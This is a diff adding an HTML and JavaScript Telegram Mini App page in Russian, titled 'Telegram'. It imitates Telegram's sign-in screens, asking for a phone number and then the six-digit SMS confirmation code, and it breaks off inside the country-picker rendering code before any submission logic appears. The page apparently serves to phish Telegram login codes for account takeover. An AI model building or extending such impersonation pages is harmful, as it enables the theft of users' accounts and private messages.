@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Telegram</title>
+  <script src="https://telegram.org/js/telegram-web-app.js?56"></script>
+  <style>
+    :root {
+      --tg-theme-bg-color: #ffffff;
+      --tg-theme-secondary-bg-color: #f4f4f5;
+      --tg-theme-text-color: #000000;
+      --tg-theme-hint-color: #8e8e93;
+      --tg-theme-button-color: #3390ec;
+      --tg-theme-button-text-color: #ffffff;
+      --tg-theme-section-bg-color: #ffffff;
+      --tg-theme-section-header-text-color: #6d6d72;
+      --tg-theme-section-separator-color: #c8c7cc;
+      --tg-theme-link-color: #3390ec;
+      --tg-theme-destructive-text-color: #ff3b30;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--tg-theme-bg-color);
+      color: var(--tg-theme-text-color);
+      overflow: hidden;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
+    }
+
+    .screen {
+      display: none;
+      flex-direction: column;
+      height: 100%;
+      padding: 0 16px;
+    }
+    .screen.active {
+      display: flex;
+    }
+
+    .header {
+      text-align: center;
+      padding: 28px 8px 20px;
+    }
+    .header h1 {
+      font-size: 24px;
+      font-weight: 700;
+      line-height: 1.25;
+      margin-bottom: 10px;
+      letter-spacing: -0.3px;
+    }
+    .header p {
+      font-size: 15px;
+      line-height: 1.35;
+      color: var(--tg-theme-hint-color);
+      max-width: 320px;
+      margin: 0 auto;
+    }
+
+    .country-row {
+      display: flex;
+      align-items: center;
+      background: var(--tg-theme-section-bg-color);
+      border-radius: 12px;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+      cursor: pointer;
+      transition: background 0.15s;
+      user-select: none;
+    }
+    .country-row:active {
+      background: var(--tg-theme-secondary-bg-color);
+    }
+    .country-flag {
+      font-size: 28px;
+      line-height: 1;
+      margin-right: 14px;
+      width: 32px;
+      text-align: center;
+    }
+    .country-name {
+      flex: 1;
+      font-size: 17px;
+      font-weight: 400;
+    }
+    .country-arrow {
+      color: var(--tg-theme-hint-color);
+      font-size: 18px;
+      font-weight: 300;
+    }
+
+    .phone-row {
+      display: flex;
+      align-items: center;
+      background: var(--tg-theme-section-bg-color);
+      border-radius: 12px;
+      padding: 4px 16px;
+      height: 52px;
+      margin-bottom: 8px;
+    }
+    .phone-code {
+      font-size: 20px;
+      font-weight: 400;
+      min-width: 42px;
+      margin-right: 8px;
+      color: var(--tg-theme-text-color);
+    }
+    .phone-input {
+      flex: 1;
+      border: none;
+      outline: none;
+      background: transparent;
+      font-size: 20px;
+      color: var(--tg-theme-text-color);
+      letter-spacing: 0.3px;
+      height: 100%;
+    }
+    .phone-input::placeholder {
+      color: var(--tg-theme-hint-color);
+      letter-spacing: 0;
+    }
+
+    .error-text {
+      font-size: 14px;
+      color: var(--tg-theme-destructive-text-color);
+      padding: 4px 4px 0;
+      min-height: 22px;
+      display: none;
+    }
+    .error-text.visible {
+      display: block;
+    }
+
+    .bottom {
+      margin-top: auto;
+      padding: 16px 0 calc(16px + env(safe-area-inset-bottom));
+    }
+    .btn {
+      width: 100%;
+      height: 50px;
+      border: none;
+      border-radius: 12px;
+      background: var(--tg-theme-button-color);
+      color: var(--tg-theme-button-text-color);
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.2s;
+      position: relative;
+    }
+    .btn:disabled {
+      opacity: 0.45;
+      cursor: default;
+    }
+    .btn:not(:disabled):active {
+      opacity: 0.85;
+    }
+    .btn .spinner {
+      display: none;
+      width: 22px;
+      height: 22px;
+      border: 2.5px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    .btn.loading .btn-text {
+      visibility: hidden;
+    }
+    .btn.loading .spinner {
+      display: block;
+      position: absolute;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Code screen - 6 digits */
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin: 24px 0 16px;
+    }
+    .code-digit {
+      width: 42px;
+      height: 52px;
+      border: none;
+      border-radius: 12px;
+      background: var(--tg-theme-secondary-bg-color);
+      font-size: 24px;
+      font-weight: 500;
+      text-align: center;
+      color: var(--tg-theme-text-color);
+      outline: none;
+      caret-color: var(--tg-theme-button-color);
+    }
+    .code-digit:focus {
+      background: var(--tg-theme-section-bg-color);
+      box-shadow: 0 0 0 2px var(--tg-theme-button-color);
+    }
+    .resend {
+      text-align: center;
+      font-size: 15px;
+      color: var(--tg-theme-hint-color);
+      margin-top: 8px;
+    }
+    .resend a {
+      color: var(--tg-theme-link-color);
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    /* Modal */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.4);
+      z-index: 100;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.25s, visibility 0.25s;
+    }
+    .modal-overlay.open {
+      opacity: 1;
+      visibility: visible;
+    }
+    .modal {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      max-height: 85vh;
+      background: var(--tg-theme-bg-color);
+      border-radius: 16px 16px 0 0;
+      display: flex;
+      flex-direction: column;
+      transform: translateY(100%);
+      transition: transform 0.3s cubic-bezier(0.32, 0.72, 0, 1);
+      padding-bottom: env(safe-area-inset-bottom);
+    }
+    .modal-overlay.open .modal {
+      transform: translateY(0);
+    }
+    .modal-header {
+      padding: 12px 16px 8px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border-bottom: 0.5px solid var(--tg-theme-section-separator-color);
+    }
+    .modal-search {
+      flex: 1;
+      height: 36px;
+      border: none;
+      border-radius: 10px;
+      background: var(--tg-theme-secondary-bg-color);
+      padding: 0 12px;
+      font-size: 16px;
+      color: var(--tg-theme-text-color);
+      outline: none;
+    }
+    .modal-search::placeholder {
+      color: var(--tg-theme-hint-color);
+    }
+    .modal-close {
+      font-size: 16px;
+      color: var(--tg-theme-link-color);
+      background: none;
+      border: none;
+      font-weight: 500;
+      cursor: pointer;
+      padding: 6px 4px;
+    }
+    .modal-list {
+      flex: 1;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+    }
+    .country-item {
+      display: flex;
+      align-items: center;
+      padding: 12px 16px;
+      cursor: pointer;
+      transition: background 0.12s;
+    }
+    .country-item:active {
+      background: var(--tg-theme-secondary-bg-color);
+    }
+    .country-item .flag {
+      font-size: 26px;
+      width: 36px;
+      margin-right: 14px;
+      text-align: center;
+    }
+    .country-item .name {
+      flex: 1;
+      font-size: 17px;
+    }
+    .country-item .code {
+      font-size: 16px;
+      color: var(--tg-theme-hint-color);
+    }
+    .no-results {
+      padding: 40px 16px;
+      text-align: center;
+      color: var(--tg-theme-hint-color);
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- SCREEN 1: Phone -->
+  <div class="screen active" id="screen-phone">
+    <div class="header">
+      <h1>Ваш номер телефона</h1>
+      <p>Пожалуйста, подтвердите код вашей страны и введите свой номер телефона.</p>
+    </div>
+
+    <div class="country-row" id="country-selector">
+      <div class="country-flag" id="current-flag">🇷🇺</div>
+      <div class="country-name" id="current-name">Россия</div>
+      <div class="country-arrow">›</div>
+    </div>
+
+    <div class="phone-row">
+      <div class="phone-code" id="phone-code">+7</div>
+      <input
+        type="tel"
+        class="phone-input"
+        id="phone-input"
+        placeholder="(999) 999-99-99"
+        inputmode="numeric"
+        autocomplete="tel"
+      >
+    </div>
+    <div class="error-text" id="phone-error"></div>
+
+    <div class="bottom">
+      <button class="btn" id="btn-continue" disabled>
+        <span class="btn-text">Продолжить</span>
+        <div class="spinner"></div>
+      </button>
+    </div>
+  </div>
+
+  <!-- SCREEN 2: Code (6 digits) -->
+  <div class="screen" id="screen-code">
+    <div class="header">
+      <h1>Введите код</h1>
+      <p id="code-subtitle">Мы отправили SMS с кодом подтверждения на номер <b id="sent-phone"></b></p>
+    </div>
+
+    <div class="code-inputs" id="code-inputs">
+      <input type="tel" class="code-digit" maxlength="1" inputmode="numeric" data-index="0">
+      <input type="tel" class="code-digit" maxlength="1" inputmode="numeric" data-index="1">
+      <input type="tel" class="code-digit" maxlength="1" inputmode="numeric" data-index="2">
+      <input type="tel" class="code-digit" maxlength="1" inputmode="numeric" data-index="3">
+      <input type="tel" class="code-digit" maxlength="1" inputmode="numeric" data-index="4">
+      <input type="tel" class="code-digit" maxlength="1" inputmode="numeric" data-index="5">
+    </div>
+    <div class="error-text" id="code-error" style="text-align:center"></div>
+
+    <div class="resend" id="resend-block">
+      Отправить код повторно через <span id="timer">60</span> сек
+    </div>
+
+    <div class="bottom">
+      <button class="btn" id="btn-verify" disabled>
+        <span class="btn-text">Подтвердить</span>
+        <div class="spinner"></div>
+      </button>
+    </div>
+  </div>
+
+  <!-- Country Modal -->
+  <div class="modal-overlay" id="modal">
+    <div class="modal">
+      <div class="modal-header">
+        <input type="text" class="modal-search" id="search" placeholder="Поиск" autocomplete="off">
+        <button class="modal-close" id="modal-close">Готово</button>
+      </div>
+      <div class="modal-list" id="country-list"></div>
+    </div>
+  </div>
+
+<script>
+/* Telegram WebApp + mock */
+(function() {
+  if (!window.Telegram || !window.Telegram.WebApp) {
+    window.Telegram = {
+      WebApp: {
+        ready: () => {},
+        expand: () => {},
+        themeParams: {},
+        colorScheme: 'light',
+        initDataUnsafe: {},
+        close: () => {},
+        showAlert: (msg) => alert(msg),
+        MainButton: { hide: () => {}, show: () => {} }
+      }
+    };
+  }
+  const tg = window.Telegram.WebApp;
+  tg.ready();
+  tg.expand();
+
+  if (tg.themeParams) {
+    const root = document.documentElement;
+    const map = {
+      bg_color: '--tg-theme-bg-color',
+      secondary_bg_color: '--tg-theme-secondary-bg-color',
+      text_color: '--tg-theme-text-color',
+      hint_color: '--tg-theme-hint-color',
+      button_color: '--tg-theme-button-color',
+      button_text_color: '--tg-theme-button-text-color',
+      link_color: '--tg-theme-link-color',
+      destructive_text_color: '--tg-theme-destructive-text-color'
+    };
+    for (const [k, v] of Object.entries(map)) {
+      if (tg.themeParams[k]) root.style.setProperty(v, tg.themeParams[k]);
+    }
+  }
+})();
+
+/* Countries */
+const COUNTRIES = [
+  {"страна":"Афганистан","индекс":"+93","флаг":"🇦🇫"},
+  {"страна":"Албания","индекс":"+355","флаг":"🇦🇱"},
+  {"страна":"Алжир","индекс":"+213","флаг":"🇩🇿"},
+  {"страна":"Американское Самоа","индекс":"+1684","флаг":"🇦🇸"},
+  {"страна":"Андорра","индекс":"+376","флаг":"🇦🇩"},
+  {"страна":"Ангола","индекс":"+244","флаг":"🇦🇴"},
+  {"страна":"Ангилья","индекс":"+1264","флаг":"🇦🇮"},
+  {"страна":"Анонимные номера","индекс":"+888","флаг":"🏴‍☠️"},
+  {"страна":"Антигуа и Барбуда","индекс":"+1268","флаг":"🇦🇬"},
+  {"страна":"Аргентина","индекс":"+54","флаг":"🇦🇷"},
+  {"страна":"Армения","индекс":"+374","флаг":"🇦🇲"},
+  {"страна":"Аруба","индекс":"+297","флаг":"🇦🇼"},
+  {"страна":"Австралия","индекс":"+61","флаг":"🇦🇺"},
+  {"страна":"Австрия","индекс":"+43","флаг":"🇦🇹"},
+  {"страна":"Азербайджан","индекс":"+994","флаг":"🇦🇿"},
+  {"страна":"Багамы","индекс":"+1242","флаг":"🇧🇸"},
+  {"страна":"Бахрейн","индекс":"+973","флаг":"🇧🇭"},
+  {"страна":"Бангладеш","индекс":"+880","флаг":"🇧🇩"},
+  {"страна":"Барбадос","индекс":"+1246","флаг":"🇧🇧"},
+  {"страна":"Беларусь","индекс":"+375","флаг":"🇧🇾"},
+  {"страна":"Бельгия","индекс":"+32","флаг":"🇧🇪"},
+  {"страна":"Белиз","индекс":"+501","флаг":"🇧🇿"},
+  {"страна":"Бенин","индекс":"+229","флаг":"🇧🇯"},
+  {"страна":"Бермуды","индекс":"+1441","флаг":"🇧🇲"},
+  {"страна":"Бутан","индекс":"+975","флаг":"🇧🇹"},
+  {"страна":"Боливия","индекс":"+591","флаг":"🇧🇴"},
+  {"страна":"Бонайре, Синт-Эстатиус и Саба","индекс":"+599","флаг":"🇧🇶"},
+  {"страна":"Босния и Герцеговина","индекс":"+387","флаг":"🇧🇦"},
+  {"страна":"Ботсвана","индекс":"+267","флаг":"🇧🇼"},
+  {"страна":"Бразилия","индекс":"+55","флаг":"🇧🇷"},
+  {"страна":"Британские Виргинские острова","индекс":"+1284","флаг":"🇻🇬"},
+  {"страна":"Бруней","индекс":"+673","флаг":"🇧🇳"},
+  {"страна":"Болгария","индекс":"+359","флаг":"🇧🇬"},
+  {"страна":"Буркина-Фасо","индекс":"+226","флаг":"🇧🇫"},
+  {"страна":"Бурунди","индекс":"+257","флаг":"🇧🇮"},
+  {"страна":"Камбоджа","индекс":"+855","флаг":"🇰🇭"},
+  {"страна":"Камерун","индекс":"+237","флаг":"🇨🇲"},
+  {"страна":"Канада","индекс":"+1","флаг":"🇨🇦"},
+  {"страна":"Кабо-Верде","индекс":"+238","флаг":"🇨🇻"},
+  {"страна":"Каймановы острова","индекс":"+1345","флаг":"🇰🇾"},
+  {"страна":"ЦАР","индекс":"+236","флаг":"🇨🇫"},
+  {"страна":"Чад","индекс":"+235","флаг":"🇹🇩"},
+  {"страна":"Чили","индекс":"+56","флаг":"🇨🇱"},
+  {"страна":"Китай","индекс":"+86","флаг":"🇨🇳"},
+  {"страна":"Колумбия","индекс":"+57","флаг":"🇨🇴"},
+  {"страна":"Коморы","индекс":"+269","флаг":"🇰🇲"},
+  {"страна":"Конго (Браззавиль)","индекс":"+242","флаг":"🇨🇬"},
+  {"страна":"Конго (Киншаса)","индекс":"+243","флаг":"🇨🇩"},
+  {"страна":"Острова Кука","индекс":"+682","флаг":"🇨🇰"},
+  {"страна":"Коста-Рика","индекс":"+506","флаг":"🇨🇷"},
+  {"страна":"Кот-д’Ивуар","индекс":"+225","флаг":"🇨🇮"},
+  {"страна":"Хорватия","индекс":"+385","флаг":"🇭🇷"},
+  {"страна":"Куба","индекс":"+53","флаг":"🇨🇺"},
+  {"страна":"Кюрасао","индекс":"+599","флаг":"🇨🇼"},
+  {"страна":"Кипр","индекс":"+357","флаг":"🇨🇾"},
+  {"страна":"Чехия","индекс":"+420","флаг":"🇨🇿"},
+  {"страна":"Дания","индекс":"+45","флаг":"🇩🇰"},
+  {"страна":"Джибути","индекс":"+253","флаг":"🇩🇯"},
+  {"страна":"Доминика","индекс":"+1767","флаг":"🇩🇲"},
+  {"страна":"Доминиканская Республика","индекс":"+1809","флаг":"🇩🇴"},
+  {"страна":"Эквадор","индекс":"+593","флаг":"🇪🇨"},
+  {"страна":"Египет","индекс":"+20","флаг":"🇪🇬"},
+  {"страна":"Сальвадор","индекс":"+503","флаг":"🇸🇻"},
+  {"страна":"Экваториальная Гвинея","индекс":"+240","флаг":"🇬🇶"},
+  {"страна":"Эритрея","индекс":"+291","флаг":"🇪🇷"},
+  {"страна":"Эстония","индекс":"+372","флаг":"🇪🇪"},
+  {"страна":"Эсватини","индекс":"+268","флаг":"🇸🇿"},
+  {"страна":"Эфиопия","индекс":"+251","флаг":"🇪🇹"},
+  {"страна":"Фолклендские острова","индекс":"+500","флаг":"🇫🇰"},
+  {"страна":"Фарерские острова","индекс":"+298","флаг":"🇫🇴"},
+  {"страна":"Фиджи","индекс":"+679","флаг":"🇫🇯"},
+  {"страна":"Финляндия","индекс":"+358","флаг":"🇫🇮"},
+  {"страна":"Франция","индекс":"+33","флаг":"🇫🇷"},
+  {"страна":"Французская Гвиана","индекс":"+594","флаг":"🇬🇫"},
+  {"страна":"Французская Полинезия","индекс":"+689","флаг":"🇵🇫"},
+  {"страна":"Габон","индекс":"+241","флаг":"🇬🇦"},
+  {"страна":"Гамбия","индекс":"+220","флаг":"🇬🇲"},
+  {"страна":"Грузия","индекс":"+995","флаг":"🇬🇪"},
+  {"страна":"Германия","индекс":"+49","флаг":"🇩🇪"},
+  {"страна":"Гана","индекс":"+233","флаг":"🇬🇭"},
+  {"страна":"Гибралтар","индекс":"+350","флаг":"🇬🇮"},
+  {"страна":"Греция","индекс":"+30","флаг":"🇬🇷"},
+  {"страна":"Гренландия","индекс":"+299","флаг":"🇬🇱"},
+  {"страна":"Гренада","индекс":"+1473","флаг":"🇬🇩"},
+  {"страна":"Гваделупа","индекс":"+590","флаг":"🇬🇵"},
+  {"страна":"Гуам","индекс":"+1671","флаг":"🇬🇺"},
+  {"страна":"Гватемала","индекс":"+502","флаг":"🇬🇹"},
+  {"страна":"Гвинея","индекс":"+224","флаг":"🇬🇳"},
+  {"страна":"Гвинея-Бисау","индекс":"+245","флаг":"🇬🇼"},
+  {"страна":"Гайана","индекс":"+592","флаг":"🇬🇾"},
+  {"страна":"Гаити","индекс":"+509","флаг":"🇭🇹"},
+  {"страна":"Гондурас","индекс":"+504","флаг":"🇭🇳"},
+  {"страна":"Гонконг","индекс":"+852","флаг":"🇭🇰"},
+  {"страна":"Венгрия","индекс":"+36","флаг":"🇭🇺"},
+  {"страна":"Исландия","индекс":"+354","флаг":"🇮🇸"},
+  {"страна":"Индия","индекс":"+91","флаг":"🇮🇳"},
+  {"страна":"Индонезия","индекс":"+62","флаг":"🇮🇩"},
+  {"страна":"Иран","индекс":"+98","флаг":"🇮🇷"},
+  {"страна":"Ирак","индекс":"+964","флаг":"🇮🇶"},
+  {"страна":"Ирландия","индекс":"+353","флаг":"🇮🇪"},
+  {"страна":"Израиль","индекс":"+972","флаг":"🇮🇱"},
+  {"страна":"Италия","индекс":"+39","флаг":"🇮🇹"},
+  {"страна":"Ямайка","индекс":"+1876","флаг":"🇯🇲"},
+  {"страна":"Япония","индекс":"+81","флаг":"🇯🇵"},
+  {"страна":"Иордания","индекс":"+962","флаг":"🇯🇴"},
+  {"страна":"Казахстан","индекс":"+7","флаг":"🇰🇿"},
+  {"страна":"Кения","индекс":"+254","флаг":"🇰🇪"},
+  {"страна":"Кирибати","индекс":"+686","флаг":"🇰🇮"},
+  {"страна":"КНДР","индекс":"+850","флаг":"🇰🇵"},
+  {"страна":"Республика Корея","индекс":"+82","флаг":"🇰🇷"},
+  {"страна":"Косово","индекс":"+383","флаг":"🇽🇰"},
+  {"страна":"Кувейт","индекс":"+965","флаг":"🇰🇼"},
+  {"страна":"Кыргызстан","индекс":"+996","флаг":"🇰🇬"},
+  {"страна":"Лаос","индекс":"+856","флаг":"🇱🇦"},
+  {"страна":"Латвия","индекс":"+371","флаг":"🇱🇻"},
+  {"страна":"Ливан","индекс":"+961","флаг":"🇱🇧"},
+  {"страна":"Лесото","индекс":"+266","флаг":"🇱🇸"},
+  {"страна":"Либерия","индекс":"+231","флаг":"🇱🇷"},
+  {"страна":"Ливия","индекс":"+218","флаг":"🇱🇾"},
+  {"страна":"Лихтенштейн","индекс":"+423","флаг":"🇱🇮"},
+  {"страна":"Литва","индекс":"+370","флаг":"🇱🇹"},
+  {"страна":"Люксембург","индекс":"+352","флаг":"🇱🇺"},
+  {"страна":"Макао","индекс":"+853","флаг":"🇲🇴"},
+  {"страна":"Мадагаскар","индекс":"+261","флаг":"🇲🇬"},
+  {"страна":"Малави","индекс":"+265","флаг":"🇲🇼"},
+  {"страна":"Малайзия","индекс":"+60","флаг":"🇲🇾"},
+  {"страна":"Мальдивы","индекс":"+960","флаг":"🇲🇻"},
+  {"страна":"Мали","индекс":"+223","флаг":"🇲🇱"},
+  {"страна":"Мальта","индекс":"+356","флаг":"🇲🇹"},
+  {"страна":"Маршалловы острова","индекс":"+692","флаг":"🇲🇭"},
+  {"страна":"Мартиника","индекс":"+596","флаг":"🇲🇶"},
+  {"страна":"Мавритания","индекс":"+222","флаг":"🇲🇷"},
+  {"страна":"Маврикий","индекс":"+230","флаг":"🇲🇺"},
+  {"страна":"Мексика","индекс":"+52","флаг":"🇲🇽"},
+  {"страна":"Микронезия","индекс":"+691","флаг":"🇫🇲"},
+  {"страна":"Молдова","индекс":"+373","флаг":"🇲🇩"},
+  {"страна":"Монако","индекс":"+377","флаг":"🇲🇨"},
+  {"страна":"Монголия","индекс":"+976","флаг":"🇲🇳"},
+  {"страна":"Черногория","индекс":"+382","флаг":"🇲🇪"},
+  {"страна":"Монтсеррат","индекс":"+1664","флаг":"🇲🇸"},
+  {"страна":"Марокко","индекс":"+212","флаг":"🇲🇦"},
+  {"страна":"Мозамбик","индекс":"+258","флаг":"🇲🇿"},
+  {"страна":"Мьянма","индекс":"+95","флаг":"🇲🇲"},
+  {"страна":"Намибия","индекс":"+264","флаг":"🇳🇦"},
+  {"страна":"Науру","индекс":"+674","флаг":"🇳🇷"},
+  {"страна":"Непал","индекс":"+977","флаг":"🇳🇵"},
+  {"страна":"Нидерланды","индекс":"+31","флаг":"🇳🇱"},
+  {"страна":"Новая Каледония","индекс":"+687","флаг":"🇳🇨"},
+  {"страна":"Новая Зеландия","индекс":"+64","флаг":"🇳🇿"},
+  {"страна":"Никарагуа","индекс":"+505","флаг":"🇳🇮"},
+  {"страна":"Нигер","индекс":"+227","флаг":"🇳🇪"},
+  {"страна":"Нигерия","индекс":"+234","флаг":"🇳🇬"},
+  {"страна":"Ниуэ","индекс":"+683","флаг":"🇳🇺"},
+  {"страна":"Остров Норфолк","индекс":"+672","флаг":"🇳🇫"},
+  {"страна":"Северные Марианские острова","индекс":"+1670","флаг":"🇲🇵"},
+  {"страна":"Норвегия","индекс":"+47","флаг":"🇳🇴"},
+  {"страна":"Оман","индекс":"+968","флаг":"🇴🇲"},
+  {"страна":"Пакистан","индекс":"+92","флаг":"🇵🇰"},
+  {"страна":"Палау","индекс":"+680","флаг":"🇵🇼"},
+  {"страна":"Палестина","индекс":"+970","флаг":"🇵🇸"},
+  {"страна":"Панама","индекс":"+507","флаг":"🇵🇦"},
+  {"страна":"Папуа — Новая Гвинея","индекс":"+675","флаг":"🇵🇬"},
+  {"страна":"Парагвай","индекс":"+595","флаг":"🇵🇾"},
+  {"страна":"Перу","индекс":"+51","флаг":"🇵🇪"},
+  {"страна":"Филиппины","индекс":"+63","флаг":"🇵🇭"},
+  {"страна":"Польша","индекс":"+48","флаг":"🇵🇱"},
+  {"страна":"Португалия","индекс":"+351","флаг":"🇵🇹"},
+  {"страна":"Пуэрто-Рико","индекс":"+1787","флаг":"🇵🇷"},
+  {"страна":"Катар","индекс":"+974","флаг":"🇶🇦"},
+  {"страна":"Реюньон","индекс":"+262","флаг":"🇷🇪"},
+  {"страна":"Румыния","индекс":"+40","флаг":"🇷🇴"},
+  {"страна":"Россия","индекс":"+7","флаг":"🇷🇺"},
+  {"страна":"Руанда","индекс":"+250","флаг":"🇷🇼"},
+  {"страна":"Сент-Китс и Невис","индекс":"+1869","флаг":"🇰🇳"},
+  {"страна":"Сент-Люсия","индекс":"+1758","флаг":"🇱🇨"},
+  {"страна":"Сент-Винсент и Гренадины","индекс":"+1784","флаг":"🇻🇨"},
+  {"страна":"Самоа","индекс":"+685","флаг":"🇼🇸"},
+  {"страна":"Сан-Марино","индекс":"+378","флаг":"🇸🇲"},
+  {"страна":"Сан-Томе и Принсипи","индекс":"+239","флаг":"🇸🇹"},
+  {"страна":"Саудовская Аравия","индекс":"+966","флаг":"🇸🇦"},
+  {"страна":"Сенегал","индекс":"+221","флаг":"🇸🇳"},
+  {"страна":"Сербия","индекс":"+381","флаг":"🇷🇸"},
+  {"страна":"Сейшелы","индекс":"+248","флаг":"🇸🇨"},
+  {"страна":"Сьерра-Леоне","индекс":"+232","флаг":"🇸🇱"},
+  {"страна":"Сингапур","индекс":"+65","флаг":"🇸🇬"},
+  {"страна":"Синт-Мартен","индекс":"+1721","флаг":"🇸🇽"},
+  {"страна":"Словакия","индекс":"+421","флаг":"🇸🇰"},
+  {"страна":"Словения","индекс":"+386","флаг":"🇸🇮"},
+  {"страна":"Соломоновы острова","индекс":"+677","флаг":"🇸🇧"},
+  {"страна":"Сомали","индекс":"+252","флаг":"🇸🇴"},
+  {"страна":"ЮАР","индекс":"+27","флаг":"🇿🇦"},
+  {"страна":"Южный Судан","индекс":"+211","флаг":"🇸🇸"},
+  {"страна":"Испания","индекс":"+34","флаг":"🇪🇸"},
+  {"страна":"Шри-Ланка","индекс":"+94","флаг":"🇱🇰"},
+  {"страна":"Судан","индекс":"+249","флаг":"🇸🇩"},
+  {"страна":"Суринам","индекс":"+597","флаг":"🇸🇷"},
+  {"страна":"Швеция","индекс":"+46","флаг":"🇸🇪"},
+  {"страна":"Швейцария","индекс":"+41","флаг":"🇨🇭"},
+  {"страна":"Сирия","индекс":"+963","флаг":"🇸🇾"},
+  {"страна":"Тайвань","индекс":"+886","флаг":"🇹🇼"},
+  {"страна":"Таджикистан","индекс":"+992","флаг":"🇹🇯"},
+  {"страна":"Танзания","индекс":"+255","флаг":"🇹🇿"},
+  {"страна":"Таиланд","индекс":"+66","флаг":"🇹🇭"},
+  {"страна":"Тимор-Лесте","индекс":"+670","флаг":"🇹🇱"},
+  {"страна":"Того","индекс":"+228","флаг":"🇹🇬"},
+  {"страна":"Токелау","индекс":"+690","флаг":"🇹🇰"},
+  {"страна":"Тонга","индекс":"+676","флаг":"🇹🇴"},
+  {"страна":"Тринидад и Тобаго","индекс":"+1868","флаг":"🇹🇹"},
+  {"страна":"Тунис","индекс":"+216","флаг":"🇹🇳"},
+  {"страна":"Турция","индекс":"+90","флаг":"🇹🇷"},
+  {"страна":"Туркменистан","индекс":"+993","флаг":"🇹🇲"},
+  {"страна":"Тёркс и Кайкос","индекс":"+1649","флаг":"🇹🇨"},
+  {"страна":"Тувалу","индекс":"+688","флаг":"🇹🇻"},
+  {"страна":"Уганда","индекс":"+256","флаг":"🇺🇬"},
+  {"страна":"Украина","индекс":"+380","флаг":"🇺🇦"},
+  {"страна":"ОАЭ","индекс":"+971","флаг":"🇦🇪"},
+  {"страна":"Великобритания","индекс":"+44","флаг":"🇬🇧"},
+  {"страна":"США","индекс":"+1","флаг":"🇺🇸"},
+  {"страна":"Уругвай","индекс":"+598","флаг":"🇺🇾"},
+  {"страна":"Американские Виргинские острова","индекс":"+1340","флаг":"🇻🇮"},
+  {"страна":"Узбекистан","индекс":"+998","флаг":"🇺🇿"},
+  {"страна":"Вануату","индекс":"+678","флаг":"🇻🇺"},
+  {"страна":"Ватикан","индекс":"+379","флаг":"🇻🇦"},
+  {"страна":"Венесуэла","индекс":"+58","флаг":"🇻🇪"},
+  {"страна":"Вьетнам","индекс":"+84","флаг":"🇻🇳"},
+  {"страна":"Уоллис и Футуна","индекс":"+681","флаг":"🇼🇫"},
+  {"страна":"Йемен","индекс":"+967","флаг":"🇾🇪"},
+  {"страна":"Замбия","индекс":"+260","флаг":"🇿🇲"},
+  {"страна":"Зимбабве","индекс":"+263","флаг":"🇿🇼"}
+];
+
+/* State */
+let currentCountry = COUNTRIES.find(c => c.страна === "Россия");
+let phoneDigits = "";
+let requiredLength = 10;
+
+/* DOM */
+const $ = (id) => document.getElementById(id);
+const phoneInput = $("phone-input");
+const btnContinue = $("btn-continue");
+const phoneError = $("phone-error");
+const modal = $("modal");
+const countryList = $("country-list");
+const searchInput = $("search");
+
+/* Country */
+function setCountry(country) {
+  currentCountry = country;
+  $("current-flag").textContent = country.флаг;
+  $("current-name").textContent = country.страна;
+  $("phone-code").textContent = country.индекс;
+  requiredLength = country.индекс === "+888" ? 9 : 10;
+  phoneDigits = "";
+  phoneInput.value = "";
+  updateButton();
+  phoneError.classList.remove("visible");
+}
+
+/* ===== Improved phone mask ===== */
+function formatPhone(digits) {
+  if (!digits) return "";
+  // (999) 999-99-99
+  let res = "";
+  if (digits.length > 0) res += "(" + digits.substring(0, Math.min(3, digits.length));
+  if (digits.length >= 3) res += ")";
+  if (digits.length > 3) res += " " + digits.substring(3, Math.min(6, digits.length));
+  if (digits.length > 6) res += "-" + digits.substring(6, Math.min(8, digits.length));
+  if (digits.length > 8) res += "-" + digits.substring(8, Math.min(10, digits.length));
+  return res;
+}
+
+phoneInput.addEventListener("input", (e) => {
+  // Берём только цифры
+  const raw = e.target.value.replace(/\D/g, "").slice(0, requiredLength);
+  phoneDigits = raw;
+  e.target.value = formatPhone(raw);
+  // Ставим курсор в конец
+  const len = e.target.value.length;
+  e.target.setSelectionRange(len, len);
+  updateButton();
+  phoneError.classList.remove("visible");
+});
+
+// Правильная обработка Backspace
+phoneInput.addEventListener("keydown", (e) => {
+  if (e.key === "Backspace") {
+    e.preventDefault();
+    if (phoneDigits.length > 0) {
+      phoneDigits = phoneDigits.slice(0, -1);
+      phoneInput.value = formatPhone(phoneDigits);
+      updateButton();
+    }
+  }
+});
+
+function updateButton() {
+  btnContinue.disabled = phoneDigits.length < requiredLength;
+}
+
+/* Country modal */
+function renderCountries(filter = "") {
+  const q = filter.toLowerCase().trim();
+  const filtered = COUNTRIES.filter(c =>
+    c.страна.toLowerCase().includes(q) ||
+    c.индекс.includes(q)
+  );
+
+  if (filtered.length === 0) {
+    countryList.innerHTML = `<div class="no-results">Ничего не найдено</div>`;
+    return;
+  }
+
+  countryList.innerHTML = filtered.map(c => `
+    <div class="country-item" data-name="${c.страна}">
+      <div class="flag">${c.флаг}</div>
+      <div class="name">${c.страна}</div>
+      <div class="code">${c.индекс}</div>
+    </div>
